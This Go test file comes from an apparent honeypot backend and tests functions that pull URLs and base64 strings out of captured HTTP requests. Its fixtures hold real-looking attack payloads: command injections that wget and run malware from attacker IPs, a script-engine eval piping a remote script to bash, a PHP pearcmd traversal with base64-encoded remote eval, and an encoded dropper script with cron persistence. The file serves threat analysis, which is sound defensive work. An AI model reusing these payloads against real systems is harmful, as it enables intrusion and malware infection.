package backend

import (
	"fmt"
	"loophid/pkg/database"
	"testing"
)

func TestExtractUrls(t *testing.T) {
	for _, test := range []struct {
		description  string
		textToSearch string
		urlsToFind   []string
	}{
		{
			description:  "finds full url",
			textToSearch: "http://www.example.org/foo?aa=bb&cc=dd#oo",
			urlsToFind:   []string{"http://www.example.org/foo?aa=bb&cc=dd#oo"},
		},
		{
			description:  "finds multiple urls",
			textToSearch: "http://www.example.org/ http://127.0.0.1/",
			urlsToFind:   []string{"http://www.example.org/", "http://127.0.0.1/"},
		},
		{
			description:  "finds multiple urls",
			textToSearch: "http://www.example.org/ http://127.0.0.1/",
			urlsToFind:   []string{"http://www.example.org/", "http://127.0.0.1/"},
		},
		{
			description:  "finds from shell script",
			textToSearch: "cd /dev;wget http://117.253.245.157:38630/i;chmod ",
			urlsToFind:   []string{"http://117.253.245.157:38630/i"},
		},
		{
			description:  "finds from command injection",
			textToSearch: "exefile=cd /tmp; wget http://interpol.edu.pl/fuez/potar.sh -O jdsp.sh; chmod 777 jdsp.sh;sh jdsp.sh Avtech;rm -rf jdsp.sh",
			urlsToFind:   []string{"http://interpol.edu.pl/fuez/potar.sh"},
		},
		{
			description:  "finds multiple urls, one ip based",
			textToSearch: "http://www.example.org/ 127.0.0.1/aa.sh",
			urlsToFind:   []string{"http://www.example.org/", "127.0.0.1/aa.sh"},
		},
		{
			description:  "finds multiple urls, one ip based with port",
			textToSearch: "http://www.example.org/ 127.0.0.1:8000/aa.sh",
			urlsToFind:   []string{"http://www.example.org/", "127.0.0.1:8000/aa.sh"},
		},
	} {

		t.Run(test.description, func(t *testing.T) {
			r := ExtractUrls(test.textToSearch)
			if len(r) != len(test.urlsToFind) {
				t.Errorf("expected %d, got %d urls (%v)", len(test.urlsToFind), len(r), r)
			}

			left := make(map[string]bool)
			for _, a := range r {
				left[a] = true
			}

			for _, a := range test.urlsToFind {
				if _, ok := left[a]; !ok {
					t.Errorf("not in: %s -> %v", a, left)
				}
			}

		})
	}
}

var table = []struct {
	input string
}{
	{input: "%22 sdd dsd s %25 sds %41"},
	{input: "%22 %7d %7e %25"},
	{input: "%22 %FF %7e %25"},
}

func BenchmarkSadencodeURL(b *testing.B) {
	for _, v := range table {
		b.Run(fmt.Sprintf("input_%s", v.input), func(b *testing.B) {
			for i := 0; i < b.N; i++ {
				roughDecodeURL(v.input)
			}
		})
	}
}

func TestRoughDencodeURL(t *testing.T) {
	for _, test := range []struct {
		description    string
		stringToDecode string
		expectedResult string
	}{
		{
			description:    "finds full url",
			stringToDecode: "haha%22",
			expectedResult: "haha\"",
		},
		{
			description:    "traversal lowercase",
			stringToDecode: "%2e%2e%2f",
			expectedResult: "../",
		},
		{
			description:    "ignores trailing %",
			stringToDecode: "truncated string %",
			expectedResult: "truncated string %",
		},
		{
			description:    "ignores non ascii char",
			stringToDecode: "aa %FF",
			expectedResult: "aa %FF",
		},
		{
			description:    "ignores lingering %",
			stringToDecode: "aa % sdfsfdfd",
			expectedResult: "aa % sdfsfdfd",
		},
	} {

		t.Run(test.description, func(t *testing.T) {
			res := roughDecodeURL(test.stringToDecode)
			if res != test.expectedResult {
				t.Errorf("got %s, expected %s", res, test.expectedResult)
			}
		})
	}
}

func TestURLExtractor(t *testing.T) {
	for _, test := range []struct {
		description string
		request     database.Request
		urlsToFind  []string
	}{
		{
			description: "Find URL in body",
			urlsToFind:  []string{"http://www.example.org/"},
			request: database.Request{

				Uri:        "/ignored?aa=bb",
				Raw:        "nothing",
				Body:       []byte("dsd http://www.example.org/ fd"),
				HoneypotIP: "1.1.1.1",
			},
		},
		{
			description: "Ignores honeypot IP",
			urlsToFind:  []string{},
			request: database.Request{
				Uri:        "/ignored?aa=bb",
				Raw:        "nothing",
				Body:       []byte("dsd http://1.1.1.1/ fd"),
				HoneypotIP: "1.1.1.1",
			},
		},
		{
			description: "Find URL in body (encoded)",
			urlsToFind:  []string{"http://192.210.162.147/arm7"},
			request: database.Request{
				Uri:        "/ignored?aa=bb",
				Raw:        "ssadsa application/x-www-form-urlencoded ds",
				Body:       []byte("remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://192.210.162.147/arm7;chmod+777+arm7;./arm7 zyxel;rm+-rf+arm7%3b"),
				HoneypotIP: "1.1.1.1",
			},
		},
		{
			description: "Find URL in body (not encoded, with semi colon)",
			urlsToFind:  []string{"http://1.2.3.4/arm7"},
			request: database.Request{

				Uri:        "/ignored?aa=bb",
				Raw:        "ssadsads",
				Body:       []byte("remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://1.2.3.4/arm7;chmod+777+arm7;./arm7 zyxel;rm+-rf+arm7%3b"),
				HoneypotIP: "1.1.1.1",
			},
		},
		{
			description: "Find URL in query string",
			urlsToFind:  []string{"94.103.87.71/cf.sh"},
			request: database.Request{

				Uri:        "/$%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27,%27-c%27,%27%28curl%20-s%2094.103.87.71/cf.sh%7C%7Cwget%20-q%20-O-%2094.103.87.71/cf.sh%29%7Cbash%27%29.start%28%29%22%29%7D/ ",
				Raw:        "ssadsads",
				Body:       []byte(""),
				HoneypotIP: "1.1.1.1",
			},
		},
		{
			description: "Find URL in query param name",
			urlsToFind:  []string{"http://64.83.132.82/malware/mirai.sh"},
			request: database.Request{

				Uri:        "/shell?cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F64.83.132.82%2Fmalware%2Fmirai.sh%3B%20sh%20mirai.sh",
				Raw:        "ssadsads",
				Body:       []byte(""),
				HoneypotIP: "1.1.1.1",
			},
		},

		{
			description: "Find URL in query string (not encoded)",
			urlsToFind:  []string{"http://45.86.155.249/bestone/.nekoisdaddy.mips"},
			request: database.Request{

				Uri:        "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://45.86.155.249/bestone/.nekoisdaddy.mips+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
				Raw:        "ssadsads",
				Body:       []byte(""),
				HoneypotIP: "1.1.1.1",
			},
		},
		{
			description: "Find URL in body with + string",
			urlsToFind:  []string{"http://185.225.73.177/arm7"},
			request: database.Request{

				Uri:        "/",
				Raw:        "ssadsads Content-Type: application/x-www-form-urlencoded U",
				Body:       []byte("remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://185.225.73.177/arm7;chmod+777+arm7;./arm7 rep.zyxel;rm+-rf+arm7%"),
				HoneypotIP: "1.1.1.1",
			},
		},
		{
			description: "Find URL in encoded body without urlencoded header",
			urlsToFind:  []string{"http://104.168.5.4/forti.sh"},
			request: database.Request{

				Uri:        "/",
				Raw:        "",
				Body:       []byte("ajax=1&username=test&realm=&enc=cd%20%2Ftmp%3B%20rm%20-rf%20%2A%3B%20wget%20http%3A%2F%2F104.168.5.4%2Fforti.sh%3B%20chmod%20777%20forti.sh%3B%20.%2Fforti.sh"),
				HoneypotIP: "1.1.1.1",
			},
		},
	} {

		t.Run(test.description, func(t *testing.T) {
			fmt.Printf("TEST: %s\n", test.description)
			result := make(map[string]struct{})

			ex := NewURLExtractor(result)
			ex.ParseRequest(&test.request)
			if len(result) != len(test.urlsToFind) {
				t.Errorf("expected %d, got %d urls (%v)", len(test.urlsToFind), len(result), result)
			}

			for _, a := range test.urlsToFind {
				if _, ok := result[a]; !ok {
					t.Errorf("not in: %s -> %v", a, result)
				}
			}

		})
	}
}

func TestFindBase64Strings(t *testing.T) {
	for _, test := range []struct {
		description   string
		request       database.Request
		base64sToFind []string
		asciiOnly     bool
	}{
		{
			description: "finds full match",
			request: database.Request{
				Body: []byte("aGVsbG8="),
				Uri:  "/fake",
			},
			base64sToFind: []string{"aGVsbG8="},
			asciiOnly:     true,
		},
		{
			description: "finds with rubbish after padding",
			request: database.Request{
				Body: []byte("aGVsbG8=a YQ=="),
				Uri:  "/fake",
			},
			base64sToFind: []string{"aGVsbG8=", "YQ=="},
			asciiOnly:     true,
		},
		{
			description: "finds multiple in body",
			request: database.Request{
				Body: []byte("aGVsbG8= d29ybGQ="),
				Uri:  "/fake",
			},
			base64sToFind: []string{"aGVsbG8=", "d29ybGQ="},
			asciiOnly:     true,
		},
		{
			description: "finds multiple in body and uri",
			request: database.Request{
				Body: []byte("aGVsbG8= d29ybGQ="),
				Uri:  "/fake?aa=YQ==",
			},
			base64sToFind: []string{"aGVsbG8=", "d29ybGQ=", "YQ=="},
			asciiOnly:     true,
		},
		{
			description: "finds multiple in body and uri (encoded)",
			request: database.Request{
				Body: []byte("aGVsbG8= d29ybGQ="),
				Uri:  "/fake?aa=YQ%3D%3D",
			},
			base64sToFind: []string{"aGVsbG8=", "d29ybGQ=", "YQ=="},
			asciiOnly:     true,
		},
		{
			description: "recovers invalid prefix",
			request: database.Request{
				Body: []byte("+aGVsbG8="),
				Uri:  "/fake",
			},
			base64sToFind: []string{"aGVsbG8="},
			asciiOnly:     true,
		},
		{
			description: "ignores invalid",
			request: database.Request{
				Body: []byte("aGVsbG8"),
				Uri:  "/fake",
			},
			base64sToFind: []string{},
			asciiOnly:     true,
		},
		{
			description: "ignores too small",
			request: database.Request{
				Body: []byte("a="),
				Uri:  "/fake",
			},
			base64sToFind: []string{},
			asciiOnly:     true,
		},
		{
			description: "ignores binary",
			request: database.Request{
				Body: []byte("/gEK"),
				Uri:  "/fake",
			},
			base64sToFind: []string{},
			asciiOnly:     true,
		},
		{
			description: "does not ignore binary",
			request: database.Request{
				Body: []byte("/gEK"),
				Uri:  "/fake",
			},
			base64sToFind: []string{"/gEK"},
			asciiOnly:     false,
		},

		// This is a special case because it's not successfully parsed as a URL and
		// therefore treated as a full string.
		// TODO: add fallback parameter parsing that prevents ang= from lang- to be
		// picked up as a base64 string.
		{
			description: "From URI parameter",
			request: database.Request{
				Body: []byte(""),
				Uri:  "/?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?eval(base64_decode('aWYoZmlsdGVyX3ZhcihpbmlfZ2V0KCJhbGxvd191cmxfZm9wZW4iKSxGSUxURVJfVkFMSURBVEVfQk9PTEVBTikpe2V2YWwoZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly80NS45NS4xNDcuMjM2L3giKSk7fWVsc2V7JGg9Y3VybF9pbml0KCJodHRwOi8vNDUuOTUuMTQ3LjIzNi94Iik7Y3VybF9zZXRvcHQoJGgsQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwxKTtjdXJsX3NldG9wdCgkaCxDVVJMT1BUX0hFQURFUiwwKTtldmFsKGN1cmxfZXhlYygkaCkpO2N1cmxfY2xvc2UoJGgpO30='));?>+z.php",
			},
			base64sToFind: []string{"ang=", "aWYoZmlsdGVyX3ZhcihpbmlfZ2V0KCJhbGxvd191cmxfZm9wZW4iKSxGSUxURVJfVkFMSURBVEVfQk9PTEVBTikpe2V2YWwoZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly80NS45NS4xNDcuMjM2L3giKSk7fWVsc2V7JGg9Y3VybF9pbml0KCJodHRwOi8vNDUuOTUuMTQ3LjIzNi94Iik7Y3VybF9zZXRvcHQoJGgsQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwxKTtjdXJsX3NldG9wdCgkaCxDVVJMT1BUX0hFQURFUiwwKTtldmFsKGN1cmxfZXhlYygkaCkpO2N1cmxfY2xvc2UoJGgpO30="},
			asciiOnly:     true,
		},
		{
			description: "parses body as form",
			request: database.Request{
				Body: []byte("aaaa=YWE%3D&foo=cmd+YmI%3D"),
				Raw:  "this is a hack application/x-www-form-urlencoded",
				Uri:  "/fake",
			},
			base64sToFind: []string{"YWE=", "YmI="},
			asciiOnly:     false,
		},
		{
			description: "handles real payload",
			request: database.Request{
				Uri:  "/fake",
				Body: []byte("script=def command = 'echo IyEvYmluL3NoCnJlYWRsaW5rIC9wcm9jL3NlbGYvZXhlIHwgZ3JlcCBidXN5Ym94CmlmIFsgJD8gLWVxIDAgXTsgdGhlbgogIGVjaG8gImJ1c3liaXQiCiAgZXhpdCAxCmZpCnBzIGF1eCB8IGF3ayAne2lmKCQzID4gOTApIHByaW50ICQyfScgfCB4YXJncyBraWxsIC1TSUdTVE9QCnBzIC1BIC1vIHN0YXQscGlkIHwgZ3JlcCAnXlQnIHwgYXdrICd7cHJpbnQgJDJ9JyB8IHhhcmdzIGtpbGwgLTkKaWYgWyAiJChpZCAtdSkiICE9ICIwIiBdOyB0aGVuCiAgZGlycj0kKHRpbWVvdXQgMzAgZmluZCAvIC10eXBlIGQgXCggLXBhdGggL3Byb2MgLW8gLXBhdGggL3N5cyBcKSAtcHJ1bmUgLW8gLXdyaXRhYmxlIC1leGVjdXRhYmxlIC10eXBlIGQgLXByaW50IDI+L2Rldi9udWxsIHwgaGVhZCAtbiAxKQpmaQppZiBbICIkZGlyciIgPSAiIiBdOyB0aGVuCiAgZGlycj0vdG1wCmZpCmRpcnI9IiRkaXJyL2R1ZXQiCm1rZGlyICRkaXJyCmNobW9kIDc3NyAkZGlycgpjZCAkZGlycgpzaGEyNTZzdW0gYXBwIHwgZ3JlcCBmYjEwMWY0ZGI3NzNhZDE1ZTNkZTQwMTZlNGI2NTE2YTcyMzJkYzQ5OWQ4ODY5YTI3OTUyNGJmMzRhMjhmMTU2CmlmIFsgJD8gLW5lIDAgXTsgdGhlbgogIGNobW9kIDc1NSBhcHAKICBuYW09ImNlcnQiCiAgZWRzPSJodHRwczovL2JlcnJ5c3RvcmUubWUvbGluZS1hdXRoLyRuYW0iCiAgdGltZW91dCAxMjAgY3VybCAtbyAkbmFtIC0taW5zZWN1cmUgJGVkcwogIGlmIFsgJD8gLW5lIDAgXTsgdGhlbgogICAgdGltZW91dCAxMjAgd2dldCAtTyAkbmFtICRlZHMKICAgIGlmIFsgJD8gLW5lIDAgXTsgdGhlbgogICAgICBwcmludGYgIkdFVCAvbGluZS1hdXRoLyRuYW0gSFRUUC8xLjBcclxuSG9zdDogYmVycnlzdG9yZS5tZTo0NDNcclxuXHJcbiIgfCB0aW1lb3V0IDEyMCBvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCBiZXJyeXN0b3JlLm1lOjQ0MyAyPi9kZXYvbnVsbCB8IHRhaWwgLS1ieXRlIDMzNzYyMDggPiAkbmFtICAKICAgIGZpCiAgZmkKICBvcGVuc3NsIGVuYyAtaW4gY2VydCAtZCAtYWVzMjU2IC1tZCBzaGEyNTYgLXBhc3MgJ3Bhc3M6Q00jZjM0RyNUJFYjKmc1ZVRSNSR0cicgfCB0YXIgLXp4ZiAtCiAgcm0gY2VydApmaQpjaG1vZCA3NTUgYXBwCgpjcm9ubnk9IiogKiAqICogKiAvdXNyL2Jpbi9mbG9jayAtbiAvdmFyL3RtcC92ZXJsLmxvY2sgLWMgJ2NkICRkaXJyOyBleGVjIC4vYXBwICYnIgooY3JvbnRhYiAtbCAyPi9kZXYvbnVsbDsgZWNobyAiJGNyb25ueSIpIHwgYXdrICchYVskMF0rKycgfCBjcm9udGFiIC0KCkRCVVNfU0VTU1NJT05fQlVTX0FERFJFU1M9dW5peDovcnVuL3VzZXIvJChpZCAtdSkvYnVzIHN5c3RlbWQtcnVuIC0tdXNlciAtLW9uLWNhbGVuZGFyPScqOio6MDAnIC91c3IvYmluL2Zsb2NrIC1uIC92YXIvdG1wL3ZlcmwubG9jayAtYyAnY2QgJGRpcnI7IGV4ZWMgLi9hcHAgJicKCmVjaG8gIjAgUGpjYjQzYTI5MCIgPiBzdHJwdHIKdHJhcCAnJyBTSUcKKCBzbGVlcCA0MDsga2lsbCAtOSAkUFBJRCApICYKZXhlYyAuL2FwcAo= | base64 --decode | sh'; def proc = ['sh', '-c', command].execute(); proc.waitFor();"),
			},
			base64sToFind: []string{"IyEvYmluL3NoCnJlYWRsaW5rIC9wcm9jL3NlbGYvZXhlIHwgZ3JlcCBidXN5Ym94CmlmIFsgJD8gLWVxIDAgXTsgdGhlbgogIGVjaG8gImJ1c3liaXQiCiAgZXhpdCAxCmZpCnBzIGF1eCB8IGF3ayAne2lmKCQzID4gOTApIHByaW50ICQyfScgfCB4YXJncyBraWxsIC1TSUdTVE9QCnBzIC1BIC1vIHN0YXQscGlkIHwgZ3JlcCAnXlQnIHwgYXdrICd7cHJpbnQgJDJ9JyB8IHhhcmdzIGtpbGwgLTkKaWYgWyAiJChpZCAtdSkiICE9ICIwIiBdOyB0aGVuCiAgZGlycj0kKHRpbWVvdXQgMzAgZmluZCAvIC10eXBlIGQgXCggLXBhdGggL3Byb2MgLW8gLXBhdGggL3N5cyBcKSAtcHJ1bmUgLW8gLXdyaXRhYmxlIC1leGVjdXRhYmxlIC10eXBlIGQgLXByaW50IDI+L2Rldi9udWxsIHwgaGVhZCAtbiAxKQpmaQppZiBbICIkZGlyciIgPSAiIiBdOyB0aGVuCiAgZGlycj0vdG1wCmZpCmRpcnI9IiRkaXJyL2R1ZXQiCm1rZGlyICRkaXJyCmNobW9kIDc3NyAkZGlycgpjZCAkZGlycgpzaGEyNTZzdW0gYXBwIHwgZ3JlcCBmYjEwMWY0ZGI3NzNhZDE1ZTNkZTQwMTZlNGI2NTE2YTcyMzJkYzQ5OWQ4ODY5YTI3OTUyNGJmMzRhMjhmMTU2CmlmIFsgJD8gLW5lIDAgXTsgdGhlbgogIGNobW9kIDc1NSBhcHAKICBuYW09ImNlcnQiCiAgZWRzPSJodHRwczovL2JlcnJ5c3RvcmUubWUvbGluZS1hdXRoLyRuYW0iCiAgdGltZW91dCAxMjAgY3VybCAtbyAkbmFtIC0taW5zZWN1cmUgJGVkcwogIGlmIFsgJD8gLW5lIDAgXTsgdGhlbgogICAgdGltZW91dCAxMjAgd2dldCAtTyAkbmFtICRlZHMKICAgIGlmIFsgJD8gLW5lIDAgXTsgdGhlbgogICAgICBwcmludGYgIkdFVCAvbGluZS1hdXRoLyRuYW0gSFRUUC8xLjBcclxuSG9zdDogYmVycnlzdG9yZS5tZTo0NDNcclxuXHJcbiIgfCB0aW1lb3V0IDEyMCBvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCBiZXJyeXN0b3JlLm1lOjQ0MyAyPi9kZXYvbnVsbCB8IHRhaWwgLS1ieXRlIDMzNzYyMDggPiAkbmFtICAKICAgIGZpCiAgZmkKICBvcGVuc3NsIGVuYyAtaW4gY2VydCAtZCAtYWVzMjU2IC1tZCBzaGEyNTYgLXBhc3MgJ3Bhc3M6Q00jZjM0RyNUJFYjKmc1ZVRSNSR0cicgfCB0YXIgLXp4ZiAtCiAgcm0gY2VydApmaQpjaG1vZCA3NTUgYXBwCgpjcm9ubnk9IiogKiAqICogKiAvdXNyL2Jpbi9mbG9jayAtbiAvdmFyL3RtcC92ZXJsLmxvY2sgLWMgJ2NkICRkaXJyOyBleGVjIC4vYXBwICYnIgooY3JvbnRhYiAtbCAyPi9kZXYvbnVsbDsgZWNobyAiJGNyb25ueSIpIHwgYXdrICchYVskMF0rKycgfCBjcm9udGFiIC0KCkRCVVNfU0VTU1NJT05fQlVTX0FERFJFU1M9dW5peDovcnVuL3VzZXIvJChpZCAtdSkvYnVzIHN5c3RlbWQtcnVuIC0tdXNlciAtLW9uLWNhbGVuZGFyPScqOio6MDAnIC91c3IvYmluL2Zsb2NrIC1uIC92YXIvdG1wL3ZlcmwubG9jayAtYyAnY2QgJGRpcnI7IGV4ZWMgLi9hcHAgJicKCmVjaG8gIjAgUGpjYjQzYTI5MCIgPiBzdHJwdHIKdHJhcCAnJyBTSUcKKCBzbGVlcCA0MDsga2lsbCAtOSAkUFBJRCApICYKZXhlYyAuL2FwcAo="},
			asciiOnly:     true,
		},
	} {

		t.Run(test.description, func(t *testing.T) {
			res := make(map[string][]byte)
			be := NewBase64Extractor(res, test.asciiOnly)
			be.ParseRequest(&test.request)
			if len(res) != len(test.base64sToFind) {
				t.Errorf("expected %d base64s but found %d (%v)", len(test.base64sToFind), len(res), res)
			}

			for _, v := range test.base64sToFind {
				_, ok := res[v]
				if !ok {
					t.Errorf("expected to find %s in %v", v, res)
				}
			}
		})
	}
}
